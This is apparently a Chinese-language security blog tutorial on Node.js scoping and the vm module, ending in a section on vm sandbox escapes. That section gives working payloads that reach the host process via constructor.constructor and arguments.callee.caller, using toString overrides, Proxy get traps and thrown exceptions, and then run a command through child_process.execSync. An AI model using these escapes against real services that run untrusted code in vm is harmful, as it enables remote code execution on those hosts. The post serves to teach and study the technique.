+++
title = 'Nodejs vm沙箱逃逸'
date = '2024-03-26T11:25:07+08:00'
categories = ['nodejs', '安全']
tags = ['沙箱逃逸', 'js']
+++

### 基本概念

什么是沙箱（sandbox）当我们运行一些可能会产生危害的程序，我们不能直接在主机的真实环境上进行测试，所以可以通过单独开辟一个运行代码的环境，它与主机相互隔离，但使用主机的硬件资源，我们将有危害的代码在沙箱中运行只会对沙箱内部产生一些影响，而不会影响到主机上的功能，沙箱的工作机制主要是依靠重定向，将恶意代码的执行目标重定向到沙箱内部。

vm模块是nodejs内置的模块。vm模块可以在当前Node.js 进程中创建一个新的沙箱环境，通过该沙箱环境执行用户提供的代码，以防止不安全的操作对主进程产生负面影响，但是这个vm模块的隔离功能并不完善，nodejs提供了第三方模块vm2，提供了更加安全、灵活和自定义的沙箱环境和代码执行功能。

### Node将字符串执行为代码

创建一个包含year变量的文件，通过fs模块去读取文件内容，然后用eval函数去执行内容

```js
//year.txt
var year=2024
```

```js
//1.js
let year=2024
console.log (year)
const fs = require('fs')
let aaa =fs.readFileSync("./year.txt",'UTF-8')
eval(aaa)
```

![image-20240325154429383](https://foreverwlwl.oss-cn-beijing.aliyuncs.com/typora/202403251544460.png)

可以看到报错了，因为在js中每一个模块都有自己独立的作用域，当前作用域下已经有了year变量

#### **new Function**

```js
let year=2024
console.log (year)
// const fs = require('fs')
// let aaa =fs.readFileSync("./year.txt",'UTF-8')
// eval(aaa)
const fun=new Function('year','return year+2')
console.log(fun(year))

```

这里创建了一个fun的函数，第一个参数也就是形参，第二个参数为函数主体

![image-20240325160436690](https://foreverwlwl.oss-cn-beijing.aliyuncs.com/typora/202403251604724.png)

看了上面的例子，我们如何通过传递字符串就能够将字符串执行为代码并且拥有自己的作用域呢，我们就需要用到vm模版。

### Nodejs作用域

我们可以通过require去引入文件，比如我们去引入fs模块require("fs")。每个文件都有自己的作用域，也就是我们再1.js中去require("2.js")，也不能在1.js中直接使用2.js中的变量和函数

```js
//2.js
const age=18
```

```js
//1.js
let year=2024
console.log (year)
const re= require("./2")
console.log(re.age)
```

![image-20240325171046503](https://foreverwlwl.oss-cn-beijing.aliyuncs.com/typora/202403251710555.png)

age为undefined

如果想要使用2.js中的属性，node给我们提供了exports。exports是模块公开的接口

有关exports和module.exports的区别

1. 正常对外暴露属性或者方法，使用exports
2. 如需要暴露对象（类似class，包含了很多属性和方法），就使用module.exports

```js
//2.js
exports.age=18
exports.hello=function(){
   console.log("hello")
}
```

```js
//1.js
let year=2024
console.log (year)
const fun=new Function('year','return year+2')
console.log(fun(year))
const re= require("./2")
console.log(re.age)
re.hello()
```

![image-20240325171827607](https://foreverwlwl.oss-cn-beijing.aliyuncs.com/typora/202403251718645.png)

可以看下作用域图
![image-20240325175913877](https://foreverwlwl.oss-cn-beijing.aliyuncs.com/typora/202403251759909.png)

这里的global就是全局对象，也就是谁都能访问的。就像console.log(b)=global.console.log(b)，这个global不用写出来

### vm模块一些API

#### `vm.runInThisContext(code[, options])`：

`vm.runInThisContext()` 编译 `code`，在当前 `global` 的上下文中运行它并返回结果。运行代码无权访问局部作用域，但可以访问当前 `global` 对象。
如果 `options` 是字符串，则指定文件名。

也就是在当前global下创建一个作用域(sandbox)，将code当做代码执行。sandbox可以访问到global的属性，无法访问其他包中的。

![image-20240325203016264](https://foreverwlwl.oss-cn-beijing.aliyuncs.com/typora/202403252030315.png)

```js
const vm = require('vm');
let localVar = 'initial value';

const vmResult = vm.runInThisContext('localVar = "vm";');//
console.log(`vmResult: '${vmResult}', localVar: '${localVar}'`);
// Prints: vmResult: 'vm', localVar: 'initial value'

const evalResult = eval('localVar = "eval";');
console.log(`evalResult: '${evalResult}', localVar: '${localVar}'`);
// Prints: evalResult: 'eval', localVar: 'eval'
```

#### `vm.createContext([contextObject[, options]])`：

`contextObject`:创建的沙箱对象，如果省略 `contextObject`（或显式传递为 `undefined`），将返回一个新的空 contextified 对象。v8为这个沙箱对象在当前global外再创建一个作用域，`此时这个沙箱对象就是这个作用域的全局对象`，沙箱内部无法访问global中的属性。
![image-20240326175304282](https://foreverwlwl.oss-cn-beijing.aliyuncs.com/typora/202403261753321.png)

#### `vm.runInContext(code, contextifiedObject[, options])`:

runInContext要配合上面的runInContext一起用

code:要编译和运行的 JavaScript 代码。
contextifiedObject:上边通过vm.createContext()创建的作用域沙箱对象。

```js
const vm = require('node:vm');

global.globalVar = 3;

const context = { globalVar: 1 };
vm.createContext(context);

vm.runInContext('globalVar *= 2;', context);

console.log(context);
// Prints: { globalVar: 2 }

console.log(global.globalVar);
// Prints: 3
```

#### `vm.runInNewContext()`：

它允许我们在一个新的沙盒环境中执行 JavaScript 代码，并返回执行结果。该方法接受两个参数：要执行的 JavaScript 代码和一个可选的上下文对象。

### vm沙箱逃逸

沙箱逃逸我们首先要获取process对象，然后通过require来导入具有攻击的模块，如child_process，然后通过child_process.execSync()进行RCE。而process属于全局(global)对象，我们上边说了vm.createContex() 沙箱内部无法访问global中的属性，所以目标就是将global上的process引入到沙箱中。

```js
const vm = require("vm");
const y1 = vm.runInNewContext(`this.constructor.constructor('return global')()`,{});
console.log(y1.process);
```

![image-20240325214907676](https://foreverwlwl.oss-cn-beijing.aliyuncs.com/typora/202403252149742.png)

代码通过runInNewContext()我们传递了要执行的代码和一个空对象。

这里面的this指向的是当前传递给runInNewContext的对象，这个对象是不属于沙箱环境的，访问当前对象的构造器(function)的构造器(Function)，也就是Function的构造器(function constructor)，可以利用Function对象构造一个函数并执行。(此时Function对象的上下文环境是处于主程序中的) 这里构造的函数内的语句是`return process`，结果是返回了主程序的进程。它的作用域是全局变量。拿到process对象就可以执行命令了

```js
const vm = require("vm");
const y1 = vm.runInNewContext(`this.constructor.constructor('return process')()`,{});
console.log(y1.mainModule.require('child_process').execSync('whoami').toString())

```

![image-20240325215606836](https://foreverwlwl.oss-cn-beijing.aliyuncs.com/typora/202403252156866.png)

利用y1对象的mainModule获取当前Node.js进程的主模版，然后导入child_process模版执行whoami命令通过toString()将结果输出。

#### 逃逸的一些情况

arguments.callee.caller：一个函数中的内置的属性，这个属性中保存着调用`当前函数的函数的引用`，如果是在全局作用域中调用当前函数，它的值为 null。

我们沙箱逃逸就是为了找到一个沙箱外的对象，然后通过.constructor.constructor('return process')()返回process，这样我们就能逃逸了。

我们可以在沙箱内定义一个函数，然后在沙箱外调用这个函数，那么这个函数的arguments.callee.caller属性就会返回沙箱外的一个对象。

```js
const vm = require('vm');
const script = 
`(e => {
    const a = {}
    a.toString = function () {
      const cc = arguments.callee.caller;
      const p = (cc.constructor.constructor('return process'))();
      return p.mainModule.require('child_process').execSync('whoami').toString()
    }
    return a
  })()`;

const sandbox = Object.create(null);
const context = new vm.createContext(sandbox);
const res = vm.runInContext(script, context);
console.log('Hello ' + res)
```

分析代码：

1. e => {...}定义一个匿名函数，{}里面为函数主体
2. 然后创建了一个空对象a，重写了toString方法
3. 定义一个cc来接受函数调用者
4. 后边就是执行命令

我们在外边通过console.log('Hello ' + res)，触发了重写的toString方法，沙箱内成功引入沙箱外的对象。

#### Proxy劫持

如果没有执行字符的操作·来触发toString，可以用Proxy来劫持属性。

Proxy用法：

```js
let proxy = new Proxy(target, handler)
```

- `target` —— 是要包装的对象，可以是任何东西，包括函数。
- `handler` —— 代理配置：带有“钩子”（“traps”，即拦截操作的方法）的对象。比如 `get` 钩子用于读取 `target` 属性，`set` 钩子写入 `target` 属性等等。

get钩子：读取属性时，触发get钩子。

```js
const vm = require("vm");

const script = 
`
(() =>{
    const a = new Proxy({}, {
        get: function(){
            const cc = arguments.callee.caller;
            const p = (cc.constructor.constructor('return process'))();
            return p.mainModule.require('child_process').execSync('whoami').toString();
        }
    })
    return a
})()
`;
const sandbox = Object.create(null);
const context = new vm.createContext(sandbox);
const res = vm.runInContext(script, context);
console.log(res.abc)
```

分析代码：

1. e => {...}定义一个匿名函数，{}里面为函数主体
2. 定义一个a对象，设定了一个get钩子，钩子里面用来过去调用者
3. 最后执行命令

是不是和上边toSring触发差不多呢。一个是通过toSring来触发，一个通过访问属性时触发。

#### 异常抛出沙箱

沙箱内没有返回值或者我们外部不能利用返回值，我们可以借助异常，将沙箱内的对象抛出去，然后在外部输出。

```js
const vm = require("vm");

const script = 
`
    throw new Proxy({}, {
        get: function(){
            const cc = arguments.callee.caller;
            const p = (cc.constructor.constructor('return process'))();
            return p.mainModule.require('child_process').execSync('whoami').toString();
        }
    })
`;
try {
    vm.runInContext(script, vm.createContext(Object.create(null)));
}catch(e) {
    console.log("error:" + e) 
}
```

![image-20240326174759838](https://foreverwlwl.oss-cn-beijing.aliyuncs.com/typora/202403261747908.png)

这里throw 出proxy对象，通过console.log("error:" + e) 将字符串和对象拼接，将报错信息和RCE的回显一起输出。

### 执行代码的一些绕过

这篇文章写的很详细。

[nodejs中代码执行绕过的一些技巧-安全客 - 安全资讯平台 (anquanke.com)](https://www.anquanke.com/post/id/237032)
